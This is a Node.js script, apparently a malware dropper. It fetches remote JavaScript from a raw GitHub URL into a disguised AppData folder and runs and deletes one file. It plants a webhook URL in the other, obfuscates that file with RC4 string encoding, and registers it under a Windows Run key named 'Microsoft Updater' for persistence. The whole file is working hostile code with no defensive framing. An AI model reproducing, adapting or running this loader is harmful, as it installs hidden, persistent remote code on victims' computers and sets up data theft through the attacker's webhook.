const H00K3_URL = "%WEBHOOK%";

const fs = require("fs");
const https = require("https");
const path = require("path");
const os = require("os");
const { exec, execSync } = require("child_process");

const appData = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
const targetDir = path.join(appData, "Microsoft", "Net", "System", "My", "CTLs");
const indexPath = path.join(targetDir, "index.js");
const importsPath = path.join(targetDir, "imports.js");

const indexUrl = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/4i5tyydshnyi.js";
const importsUrl = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/imports.js";

function baixarArquivo(url, destino, substituirWebhook, callback) {
  https.get(url, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      let content = data;
      if (substituirWebhook) {
        content = content.replace(/const\s+H00K\s*=\s*["']%WEBHOOK%["'];?/g, `const H00K = "${H00K3_URL}";`);
      }
      fs.mkdirSync(path.dirname(destino), { recursive: true });
      fs.writeFileSync(destino, content);
      callback();
    });
  }).on("error", () => {});
}

function adicionarAoRegistro(scriptPath) {
  const nome = "Microsoft Updater";
  const comando = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${nome}" /t REG_SZ /d "node \\"${scriptPath}\\"" /f`;
  exec(comando);
}

baixarArquivo(importsUrl, importsPath, false, () => {
  exec(`node "${importsPath}"`, () => {
    fs.unlinkSync(importsPath);

    baixarArquivo(indexUrl, indexPath, true, () => {
      const originalCode = fs.readFileSync(indexPath, "utf8");
      const JavaScriptObfuscator = require("javascript-obfuscator");
      const obfuscated = JavaScriptObfuscator.obfuscate(originalCode, {
        compact: true,
        controlFlowFlattening: true,
        deadCodeInjection: true,
        stringArrayEncoding: ["rc4"],
        simplify: true
      }).getObfuscatedCode();
      fs.writeFileSync(indexPath, obfuscated);

      adicionarAoRegistro(indexPath);
    });
  });
});
